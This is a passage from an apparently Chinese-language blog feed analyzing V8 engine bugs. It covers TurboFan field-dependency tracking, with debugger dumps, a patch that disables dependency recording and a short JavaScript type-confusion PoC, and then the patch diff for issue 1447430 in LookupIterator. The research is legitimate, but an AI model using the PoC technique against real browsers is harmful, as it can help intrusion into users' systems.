里面只有一个字段看起来是与map相关的，即field_owner 我们写一个例子来看一下 var o = {'p':{'q':1.1}}; %DebugPrint(o); %DebugPrint(o.p); %SystemBreak(); DebugPrint: 0x273fe544b249: [JS_OBJECT_TYPE] - map: 0x11232970a6b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt; - elements: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; { #p: 0x273fe544b269 &lt;Object map = 0x11232970a669&gt; (const data field 0) } 0x11232970a6b9: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x11232970a619 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x2a8e03680659 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x273fe544b2b9 &lt;DescriptorArray[1]&gt; - layout descriptor: (nil) - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt; - constructor: 0x1b89284c2119 &lt;JSFunction Object (sfi = 0x2a8e036898e9)&gt; - dependent code: 0x1cf27a1c02a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 DebugPrint: 0x273fe544b269: [JS_OBJECT_TYPE] - map: 0x11232970a669 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt; - elements: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS] - properties: 0x1cf27a1c0c01 &lt;FixedArray[0]&gt; { #q: &lt;unboxed double&gt; 1.1 (const data field 0) } 0x11232970a669: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x11232970a619 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x2a8e03680659 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x273fe544b289 &lt;DescriptorArray[1]&gt; - layout descriptor: 0x100000000 - prototype: 0x1b89284c20e1 &lt;Object map = 0x112329700209&gt; - constructor: 0x1b89284c2119 &lt;JSFunction Object (sfi = 0x2a8e036898e9)&gt; - dependent code: 0x1cf27a1c02a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 pwndbg&gt; job 0x273fe544b2b9 0x273fe544b2b9: [DescriptorArray] - map: 0x1cf27a1c0251 &lt;Map&gt; - enum_cache: empty - nof slack descriptors: 0 - nof descriptors: 1 - raw marked descriptors: mc epoch 0, marked 0 [0]: #p (const data field 0:h, p: 0, attrs: [WEC]) @ Class(0x11232970a669) pwndbg&gt; tel 0x273fe544b2b9-1 00:0000│ 0x273fe544b2b8 —▸ 0x1cf27a1c0251 ◂— 0x1cf27a1c01 01:0008│ 0x273fe544b2c0 ◂— 0x10001 02:0010│ 0x273fe544b2c8 —▸ 0x1cf27a1c2389 ◂— 0x100001cf27a1c23 03:0018│ 0x273fe544b2d0 —▸ 0x1b89284df859 ◂— 0x4200001cf27a1c04 04:0020│ 0x273fe544b2d8 ◂— 0xc400000000 05:0028│ 0x273fe544b2e0 —▸ 0x11232970a66b ◂— 0x4030400001cf27a # field map 06:0030│ 0x273fe544b2e8 ◂— 0xdeadbeedbeadbeef 07:0038│ 0x273fe544b2f0 ◂— 0xdeadbeedbeadbeef pwndbg&gt; job 0x1b89284df859 #p 可以观察到o对象的instace_descriptor的DescriptorArray中拥有p的map 看似此时可以得到FindFieldOwner返回的应该是字段的map的结论，但是调试过后发现并非如此 分析map的FindFieldOwner函数，理论上该函数应当与mapref中的函数返回相同结果 这里进行了一个循环，遍历对象的back pointer链来寻找一个拥有descriptor索引的instance_descriptor，并将具有这个instace_descriptor的对象作为map返回 但是我们这里的back pointer是不存在这个属性的 pwndbg&gt; job 0xe2008c0a6b9 0xe2008c0a6b9: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x0e2008c0a619 &lt;Map(HOLEY_ELEMENTS)&gt; # back pointer链 - prototype_validity cell: 0x0d2e9b9c0659 &lt;Cell value= 1&gt; - instance descriptors (own) #1: 0x31de10fcb5c1 &lt;DescriptorArray[1]&gt; # 长度 == 1, 需要找到一个有0索引的对象 - layout descriptor: (nil) - prototype: 0x24c1d11820e1 &lt;Object map = 0xe2008c00209&gt; - constructor: 0x24c1d1182119 &lt;JSFunction Object (sfi = 0xd2e9b9c98e9)&gt; - dependent code: 0x02f667c402a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 pwndbg&gt; job 0x0e2008c0a619 0xe2008c0a619: [Map] - type: JS_OBJECT_TYPE - instance size: 32 - inobject properties: 1 - elements kind: HOLEY_ELEMENTS - unused property fields: 1 - enum length: invalid - back pointer: 0x02f667c404b1 &lt;undefined&gt; # 链尾 - prototype_validity cell: 0x0d2e9b9c0659 &lt;Cell value= 1&gt; - instance descriptors (own) #0: 0x02f667c40239 &lt;DescriptorArray[0]&gt; # 长度 == 0 - layout descriptor: (nil) - transitions #2: 0x24c1d119fe11 &lt;TransitionArray[6]&gt;Transition array #2: #a: (transition to (const data field, attrs: [WEC]) @ Class(0xe2008c0a669)) -&gt; 0x0e2008c0a6b9 &lt;Map(HOLEY_ELEMENTS)&gt; #m: (transition to (const data field, attrs: [WEC]) @ Any) -&gt; 0x0e2008c0a669 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype: 0x24c1d11820e1 &lt;Object map = 0xe2008c00209&gt; - constructor: 0x24c1d1182119 &lt;JSFunction Object (sfi = 0xd2e9b9c98e9)&gt; - dependent code: 0x02f667c402a1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0 所以这个函数最后返回的依然是本对象的map，而不是先前推测的字段属性的map， 而关于之前DescriptorArray中的map的来源，从chromium code search里DescriptorArray的注释中提到结构中的value可能会有一个map的weak reference，但是并没有解释其作用与具体指向 我们可以以此推测jsheapbroker实际上会对js对象的一些数据做cache，将对象的字段的owner记录在PropertyDescriptor结构中，这样就省去了每次遍历back pointer的开销 查找一下引用会发现在SerializeOwnDescriptor中，存在对PropertyDescriptor的创建 简要分析可以发现该函数透过jsheapbroker更新了map的instance_descriptor中对应属性的PropertyDescriptor信息，验证了我们刚才的推测 回到函数，可以确认此时owner为拥有此属性的对象的map InstallDependency的逻辑较为简单，更新将code插入map的dependent code字段数组中 我们看到PropertyAccessBuilder的BuildCheckMaps函数的逻辑 可以看到这里有两种方式，第一种判断了receiver的map是否stable，如果stable，且根据access_info得到的receiver_maps中确实有这个map，则添加一个StableMap的依赖 否则创建一个checkmaps的node，在运行时鉴别对象的map 这里也说明了v8中有两种deoptimize的机制，一种是通过依赖来标记代码，在运行时若发生了依赖变化，则deoptimize相应代码，另一种则是使用checkmaps的代码来运行时检查map类型是否匹配 map的dependent code就是为了deoptimize而设，当map变为unstable时，即可根据该字段来遍历所有依赖当前stable map的optimized code 所有依赖在Commit函数中被Install，时机为编译流水线的结尾 此时审视我们最开始得到的patch +#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldRepresentationDependencyOffTheRecord(map_ref, descriptor)); +#endif if (descriptors_field_type-&gt;IsClass()) { // Remember the field map, and try to infer a useful type. Handle&lt;Map&gt; map(descriptors_field_type-&gt;AsClass(), isolate()); @@ -384,15 +386,17 @@ PropertyAccessInfo AccessInfoFactory::ComputeDataFieldAccessInfo( } // TODO(turbofan): We may want to do this only depending on the use // of the access info. +#if 0 unrecorded_dependencies.push_back( dependencies()-&gt;FieldTypeDependencyOffTheRecord(map_ref, descriptor)); +#endif FieldType根据一些代码可以知道实际就是指代字段的map 这里将两个依赖注释了，导致当字段属性的representation为HeapObject时，程序没有正确地记录FieldOwner对于field的representation与type的依赖，而记录是通过对map install dependent code来完成的，因此在函数编译后，修改FieldOwner类型理论上也不会 所以理论上可以修改FieldOwner的类型来造成类型混淆 我们还需要确定一下函数的触发路径 在chromium code search中查找一下patch函数引用 只出现在ComputePropertyAccessInfo中，继续往下找 有两个引用 分别查看一下 GetPropertyAccessInfo用的更加频繁一些，同时注意到有一个ReduceNamedAccess，这表明turbofan在优化具名属性访问如o.xxx时会引用到这里的结果 剖析poc function opt(o) { return o.x.y; } let obj = {x: {y: 1.1}} for (let i = 0; i &lt; 100000; i++) opt(obj); obj.x = {z: {}}; console.log(opt(obj)) 观察生成的字节码 opt函数产生了两次属性访问 通过以下命令进行调试 gdb --args ./d8 --allow-natives-syntax --trace-opt-verbose --trace-deopt ./poc.js 通过turbolizer观察编译过程中的节点变化 发现产生了两个checkmaps，与我们预期的通过depend code进行deoptimize有些不符 且在loadelimination阶段将第二个checkmaps去除 分析checkmaps的出处 当receiver转换为string或number失败时调用BuildCheckMaps 调试发现m.HasValue()对于两次调用均不成立 发现此函数需要node的opcode为HeapConstant，难以满足，所以落入checkmaps的path 通过调试也发现dependent code集中在o.x而非o 分析loadelimination中发生的事 调用ReduceCheckMaps，第一次调用时，node state中没有记录map，通过该checkmaps后更新check的map范围到node state中 再经过ReduceLoadField获取到field的map，更新到node state中，故第二次时map会落入范围中，成功reduce poc中最后使用了重赋值来修改obj.x的类型，这个操作并不会改变obj的map 同时也注意到obj的初始化方式较为特别 let obj = {x: {y: 1.1}} v8中初始化对象时，若采取以下形式 let a = {b:1,c:2,d:3,e:4,f:5} 则v8会尽量优化成a对象中带有5个inline property，直接依附在对象结构上，而不在Properties数组中 同时一个字典默认初始化时，一般会带有4个默认的slot来存放property let a = {} a.x0 = 0; // inline a.x1 = 1; // inline a.x2 = 2; // inline a.x3 = 3; // inline a.x4 = 4; // in properties 具体可以参考v8 blogs中的这篇文章 同时触发混淆的成员名不能与原来相同 let obj = {x: {y: 1.1}} for (let i = 0; i &lt; 100000; i++) opt(obj); obj.x = {z: {}}; console.log(opt(obj)) 即此处的z不能为y 因为这样创造出来的{y:{}}实际是{y:1.1}的泛化 由于v8的field representation generalization机制，当一个field被修改成一个更加泛用的类型的值时，如smi修改为Tagged指针，为了表示这样的转变，v8根据版本不同会有两种处理方式，较早的版本会建立一个新map，将field representation修改为Tagged，将原来的map舍弃，较新的版本考虑到性能问题，会就地进行可兼容的representation转换，但是这两种方法最终都会invalidate code dependency，导致deoptimize 这个逻辑实现在Map::GeneralizeField中]]></summary></entry><entry><title type="html">v8 issue 1447430分析</title><link href="http://localhost:4000/v8/2023/07/28/issue1447430.html" rel="alternate" type="text/html" title="v8 issue 1447430分析" /><published>2023-07-28T15:20:22+08:00</published><updated>2023-07-28T15:20:22+08:00</updated><id>http://localhost:4000/v8/2023/07/28/issue1447430</id><content type="html" xml:base="http://localhost:4000/v8/2023/07/28/issue1447430.html"><![CDATA[<h2 id="patch分析">patch分析</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git fetch origin refs/tags/11.4.183.17 <span class="c"># release in 5.26</span>
git fetch origin refs/tags/11.4.183.19 <span class="c"># patched version</span>
git checkout 114.1.183.19
git diff 114.1.183.17
</code></pre></div></div>

<p>patch主要分为两部分，一部分在patch ic的代码，另一部分主要在patch关于LookupIterator的代码</p>

<p>经过一些调查可以发现主要是LookupIterator的代码较为相关</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff --git a/src/objects/lookup-inl.h b/src/objects/lookup-inl.h
index 00c95e013c..8b5717021b 100644
</span><span class="gd">--- a/src/objects/lookup-inl.h
</span><span class="gi">+++ b/src/objects/lookup-inl.h
</span><span class="p">@@ -190,7 +190,7 @@</span> Handle&lt;Name&gt; PropertyKey::GetName(Isolate* isolate) {
 }
 
 Handle&lt;Name&gt; LookupIterator::name() const {
<span class="gd">-  DCHECK(!IsElement(*holder_));
</span><span class="gi">+  DCHECK_IMPLIES(!holder_.is_null(), !IsElement(*holder_));
</span>   return name_;
 }
 
<span class="p">@@ -285,6 +285,7 @@</span> void LookupIterator::UpdateProtector() {
 }
 
 InternalIndex LookupIterator::descriptor_number() const {
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(!IsElement(*holder_));
   DCHECK(has_property_);
   DCHECK(holder_-&gt;HasFastProperties(isolate_));
<span class="p">@@ -292,6 +293,7 @@</span> InternalIndex LookupIterator::descriptor_number() const {
 }
 
 InternalIndex LookupIterator::dictionary_entry() const {
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(!IsElement(*holder_));
   DCHECK(has_property_);
   DCHECK(!holder_-&gt;HasFastProperties(isolate_));
<span class="p">@@ -306,13 +308,14 @@</span> LookupIterator::Configuration LookupIterator::ComputeConfiguration(
 }
 
 // static
<span class="gd">-Handle&lt;JSReceiver&gt; LookupIterator::GetRoot(Isolate* isolate,
-                                           Handle&lt;Object&gt; lookup_start_object,
-                                           size_t index) {
</span><span class="gi">+MaybeHandle&lt;JSReceiver&gt; LookupIterator::GetRoot(
+    Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index,
+    Configuration configuration) {
</span>   if (lookup_start_object-&gt;IsJSReceiver(isolate)) {
     return Handle&lt;JSReceiver&gt;::cast(lookup_start_object);
   }
<span class="gd">-  return GetRootForNonJSReceiver(isolate, lookup_start_object, index);
</span><span class="gi">+  return GetRootForNonJSReceiver(isolate, lookup_start_object, index,
+                                 configuration);
</span> }
 
 template &lt;class T&gt;
<span class="gh">diff --git a/src/objects/lookup.cc b/src/objects/lookup.cc
index 8fceef1ad1..78c509b863 100644
</span><span class="gd">--- a/src/objects/lookup.cc
</span><span class="gi">+++ b/src/objects/lookup.cc
</span><span class="p">@@ -42,27 +42,20 @@</span> PropertyKey::PropertyKey(Isolate* isolate, Handle&lt;Object&gt; key, bool* success) {
   }
 }
 
<span class="gd">-LookupIterator::LookupIterator(Isolate* isolate, Handle&lt;Object&gt; receiver,
-                               Handle&lt;Name&gt; name, Handle&lt;Map&gt; transition_map,
-                               PropertyDetails details, bool has_property)
-    : configuration_(DEFAULT),
-      state_(TRANSITION),
-      has_property_(has_property),
-      interceptor_state_(InterceptorState::kUninitialized),
-      property_details_(details),
-      isolate_(isolate),
-      name_(name),
-      transition_(transition_map),
-      receiver_(receiver),
-      lookup_start_object_(receiver),
-      index_(kInvalidIndex) {
-  holder_ = GetRoot(isolate, lookup_start_object_);
-}
-
</span> template &lt;bool is_element&gt;
 void LookupIterator::Start() {
   // GetRoot might allocate if lookup_start_object_ is a string.
<span class="gd">-  holder_ = GetRoot(isolate_, lookup_start_object_, index_);
</span><span class="gi">+  MaybeHandle&lt;JSReceiver&gt; maybe_holder =
+      GetRoot(isolate_, lookup_start_object_, index_, configuration_);
+  if (!maybe_holder.ToHandle(&amp;holder_)) {
+    // This is an attempt to perform an own property lookup on a non-JSReceiver
+    // that doesn't have any properties.
+    DCHECK(!lookup_start_object_-&gt;IsJSReceiver());
+    DCHECK(!check_prototype_chain());
+    has_property_ = false;
+    state_ = NOT_FOUND;
+    return;
+  }
</span> 
   {
     DisallowGarbageCollection no_gc;
<span class="p">@@ -135,19 +128,27 @@</span> template void LookupIterator::RestartInternal&lt;true&gt;(InterceptorState);
 template void LookupIterator::RestartInternal&lt;false&gt;(InterceptorState);
 
 // static
<span class="gd">-Handle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(
-    Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index) {
-  // Strings are the only objects with properties (only elements) directly on
-  // the wrapper. Hence we can skip generating the wrapper for all other cases.
-  if (lookup_start_object-&gt;IsString(isolate) &amp;&amp;
-      index &lt;
-          static_cast&lt;size_t&gt;(String::cast(*lookup_start_object).length())) {
-    // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the native
-    // context, ensuring that we don't leak it into JS?
-    Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();
-    Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);
-    Handle&lt;JSPrimitiveWrapper&gt;::cast(result)-&gt;set_value(*lookup_start_object);
-    return result;
</span><span class="gi">+MaybeHandle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(
+    Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index,
+    Configuration configuration) {
+  // Strings are the only non-JSReceiver objects with properties (only elements
+  // and 'length') directly on the wrapper. Hence we can skip generating
+  // the wrapper for all other cases.
+  bool own_property_lookup = (configuration &amp; kPrototypeChain) == 0;
+  if (lookup_start_object-&gt;IsString(isolate)) {
+    if (own_property_lookup ||
+        index &lt;
+            static_cast&lt;size_t&gt;(String::cast(*lookup_start_object).length())) {
+      // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the
+      // native context, ensuring that we don't leak it into JS?
+      Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();
+      Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);
+      Handle&lt;JSPrimitiveWrapper&gt;::cast(result)-&gt;set_value(*lookup_start_object);
+      return result;
+    }
+  } else if (own_property_lookup) {
+    // Signal that the lookup will not find anything.
+    return {};
</span>   }
   Handle&lt;HeapObject&gt; root(
       lookup_start_object-&gt;GetPrototypeChainRootMap(isolate).prototype(isolate),
<span class="p">@@ -918,6 +919,7 @@</span> Handle&lt;Object&gt; LookupIterator::FetchValue(
 }
 
 bool LookupIterator::CanStayConst(Object value) const {
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(!IsElement(*holder_));
   DCHECK(holder_-&gt;HasFastProperties(isolate_));
   DCHECK_EQ(PropertyLocation::kField, property_details_.location());
<span class="p">@@ -951,6 +953,7 @@</span> bool LookupIterator::CanStayConst(Object value) const {
 }
 
 bool LookupIterator::DictCanStayConst(Object value) const {
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(!IsElement(*holder_));
   DCHECK(!holder_-&gt;HasFastProperties(isolate_));
   DCHECK(!holder_-&gt;IsJSGlobalObject());
<span class="p">@@ -997,6 +1000,7 @@</span> int LookupIterator::GetAccessorIndex() const {
 
 FieldIndex LookupIterator::GetFieldIndex() const {
   DCHECK(has_property_);
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(holder_-&gt;HasFastProperties(isolate_));
   DCHECK_EQ(PropertyLocation::kField, property_details_.location());
   DCHECK(!IsElement(*holder_));
<span class="p">@@ -1004,6 +1008,7 @@</span> FieldIndex LookupIterator::GetFieldIndex() const {
 }
 
 Handle&lt;PropertyCell&gt; LookupIterator::GetPropertyCell() const {
<span class="gi">+  DCHECK(!holder_.is_null());
</span>   DCHECK(!IsElement(*holder_));
   Handle&lt;JSGlobalObject&gt; holder = GetHolder&lt;JSGlobalObject&gt;();
   return handle(holder-&gt;global_dictionary(isolate_, kAcquireLoad)
<span class="gh">diff --git a/src/objects/lookup.h b/src/objects/lookup.h
index 06ed50e97b..5d2d926b7e 100644
</span><span class="gd">--- a/src/objects/lookup.h
</span><span class="gi">+++ b/src/objects/lookup.h
</span><span class="p">@@ -222,11 +222,6 @@</span> class V8_EXPORT_PRIVATE LookupIterator final {
                         Handle&lt;Object&gt; lookup_start_object,
                         Configuration configuration);
 
<span class="gd">-  // For |ForTransitionHandler|.
-  LookupIterator(Isolate* isolate, Handle&lt;Object&gt; receiver, Handle&lt;Name&gt; name,
-                 Handle&lt;Map&gt; transition_map, PropertyDetails details,
-                 bool has_property);
-
</span>   static void InternalUpdateProtector(Isolate* isolate, Handle&lt;Object&gt; receiver,
                                       Handle&lt;Name&gt; name);
 
<span class="p">@@ -286,12 +281,12 @@</span> class V8_EXPORT_PRIVATE LookupIterator final {
                                                    Configuration configuration,
                                                    Handle&lt;Name&gt; name);
 
<span class="gd">-  static Handle&lt;JSReceiver&gt; GetRootForNonJSReceiver(
-      Isolate* isolate, Handle&lt;Object&gt; lookup_start_object,
-      size_t index = kInvalidIndex);
-  static inline Handle&lt;JSReceiver&gt; GetRoot(Isolate* isolate,
-                                           Handle&lt;Object&gt; lookup_start_object,
-                                           size_t index = kInvalidIndex);
</span><span class="gi">+  static MaybeHandle&lt;JSReceiver&gt; GetRootForNonJSReceiver(
+      Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index,
+      Configuration configuration);
+  static inline MaybeHandle&lt;JSReceiver&gt; GetRoot(
+      Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index,
+      Configuration configuration);
</span> 
   State NotFound(JSReceiver const holder) const;
</code></pre></div></div>

<p>patch的核心修改在于为LookupIterator的GetRoot方法中的nonReceiver path添加了一个early return</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // static
<span class="gd">-Handle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(
-    Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index) {
-  // Strings are the only objects with properties (only elements) directly on
-  // the wrapper. Hence we can skip generating the wrapper for all other cases.
-  if (lookup_start_object-&gt;IsString(isolate) &amp;&amp;
-      index &lt;
-          static_cast&lt;size_t&gt;(String::cast(*lookup_start_object).length())) {
-    // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the native
-    // context, ensuring that we don't leak it into JS?
-    Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();
-    Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);
-    Handle&lt;JSPrimitiveWrapper&gt;::cast(result)-&gt;set_value(*lookup_start_object);
-    return result;
</span><span class="gi">+MaybeHandle&lt;JSReceiver&gt; LookupIterator::GetRootForNonJSReceiver(
+    Isolate* isolate, Handle&lt;Object&gt; lookup_start_object, size_t index,
+    Configuration configuration) {
+  // Strings are the only non-JSReceiver objects with properties (only elements
+  // and 'length') directly on the wrapper. Hence we can skip generating
+  // the wrapper for all other cases.
+  bool own_property_lookup = (configuration &amp; kPrototypeChain) == 0;
+  if (lookup_start_object-&gt;IsString(isolate)) {
+    if (own_property_lookup ||
+        index &lt;
+            static_cast&lt;size_t&gt;(String::cast(*lookup_start_object).length())) {
+      // TODO(verwaest): Speed this up. Perhaps use a cached wrapper on the
+      // native context, ensuring that we don't leak it into JS?
+      Handle&lt;JSFunction&gt; constructor = isolate-&gt;string_function();
+      Handle&lt;JSObject&gt; result = isolate-&gt;factory()-&gt;NewJSObject(constructor);
+      Handle&lt;JSPrimitiveWrapper&gt;::cast(result)-&gt;set_value(*lookup_start_object);
+      return result;
+    }
+  } else if (own_property_lookup) {
+    // Signal that the lookup will not find anything.
+    return {};
</span></code></pre></div></div>

<p>修改了函数原型，新增了一个变量own_property_lookup和参数configuration，</p>

<p>configuration为属性查找过程的配置</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">enum</span> <span class="n">Configuration</span> <span class="p">{</span>
    <span class="c1">// Configuration bits.</span>
    <span class="n">kInterceptor</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">kPrototypeChain</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">,</span>

    <span class="c1">// Convenience combinations of bits.</span>
    <span class="n">OWN_SKIP_INTERCEPTOR</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">OWN</span> <span class="o">=</span> <span class="n">kInterceptor</span><span class="p">,</span>
    <span class="n">PROTOTYPE_CHAIN_SKIP_INTERCEPTOR</span> <span class="o">=</span> <span class="n">kPrototypeChain</span><span class="p">,</span>
    <span class="n">PROTOTYPE_CHAIN</span> <span class="o">=</span> <span class="n">kPrototypeChain</span> <span class="o">|</span> <span class="n">kInterceptor</span><span class="p">,</span>
    <span class="n">DEFAULT</span> <span class="o">=</span> <span class="n">PROTOTYPE_CHAIN</span>
  <span class="p">};</span>
</code></pre></div></div>

<p>主要用于指示查找过程中是否考虑js对象原型链与interceptor，这里interceptor应指如getter，proxy等控制属性访问的函数</p>

<p>添加的own_property_lookup指示当前是否只搜索本对象内的属性，当为真且key并非String的时候，会直接return一个空值，不再进行GetRootForNonJSReceiver下方的原型链搜索</p>

<p>修改的其他代码也主要是为了这段修改进行适配，如调用GetRoot的Start()</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code> template &lt;bool is_element&gt;
 void LookupIterator::Start() {
   // GetRoot might allocate if lookup_start_object_ is a string.
<span class="gd">-  holder_ = GetRoot(isolate_, lookup_start_object_, index_);
</span><span class="gi">+  MaybeHandle&lt;JSReceiver&gt; maybe_holder =
+      GetRoot(isolate_, lookup_start_object_, index_, configuration_);
+  if (!maybe_holder.ToHandle(&amp;holder_)) {
+    // This is an attempt to perform an own property lookup on a non-JSReceiver
+    // that doesn't have any properties.
+    DCHECK(!lookup_start_object_-&gt;IsJSReceiver());
+    DCHECK(!check_prototype_chain());
+    has_property_ = false;
+    state_ = NOT_FOUND;
+    return;
+  }
</span></code></pre></div></div>

<p>为了兼容返回的空值，进行了一些额外判断，同时也写上了重要的注释，表明此修改是为了应对non-JSReceiver上的own property查找</p>

<p>所以可以得出，原代码在遇到一个没有任何属性的<code class="language-plaintext highlighter-rouge">non-JSReceiver</code>时，即使在标注了不应该进行原型链搜索的情况下，依然会执行搜索的代码</p>

<p>我们分析<code class="language-plaintext highlighter-rouge">configuration</code>的来源来确定什么时候不需要原型链搜索</p>

<p>可以发现主要是在<code class="language-plaintext highlighter-rouge">LookupIterator</code>的构造函数中所赋值</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">inline</span> <span class="nf">LookupIterator</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                        <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lookup_start_object</span><span class="p">,</span>
                        <span class="n">Configuration</span> <span class="n">configuration</span> <span class="o">=</span> <span class="n">DEFAULT</span><span class="p">);</span>  <span class="c1">// 默认配置为DEFALUT-&gt; kPrototypeChain | kInterceptor</span>
<span class="p">...</span>
<span class="p">...</span>
<span class="n">LookupIterator</span><span class="o">::</span><span class="n">LookupIterator</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lookup_start_object</span><span class="p">,</span>
                               <span class="n">Configuration</span> <span class="n">configuration</span><span class="p">)</span>
    <span class="o">:</span> <span class="n">LookupIterator</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">kInvalidIndex</span><span class="p">,</span>   <span class="c1">// 调用另一个构造函数</span>
                     <span class="n">lookup_start_object</span><span class="p">,</span> <span class="n">configuration</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">...</span>
<span class="p">...</span>
<span class="c1">// This private constructor is the central bottleneck that all the other</span>
<span class="c1">// constructors use.</span>
<span class="n">LookupIterator</span><span class="o">::</span><span class="n">LookupIterator</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span> <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">receiver</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">index</span><span class="p">,</span>
                               <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">lookup_start_object</span><span class="p">,</span>
                               <span class="n">Configuration</span> <span class="n">configuration</span><span class="p">)</span>
    <span class="o">:</span> <span class="n">configuration_</span><span class="p">(</span><span class="n">ComputeConfiguration</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">configuration</span><span class="p">,</span> <span class="n">name</span><span class="p">)),</span>  <span class="c1">// 调用ComputeConfiguration</span>
      <span class="n">isolate_</span><span class="p">(</span><span class="n">isolate</span><span class="p">),</span>
      <span class="n">name_</span><span class="p">(</span><span class="n">name</span><span class="p">),</span>
      <span class="n">receiver_</span><span class="p">(</span><span class="n">receiver</span><span class="p">),</span>
      <span class="n">lookup_start_object_</span><span class="p">(</span><span class="n">lookup_start_object</span><span class="p">),</span>
      <span class="n">index_</span><span class="p">(</span><span class="n">index</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">IsElement</span><span class="p">())</span> <span class="p">{</span>
    <span class="c1">// If we're not looking at a TypedArray, we will need the key represented</span>
    <span class="c1">// as an internalized string.</span>
    <span class="p">...</span>
    <span class="p">...</span>
<span class="c1">// static</span>
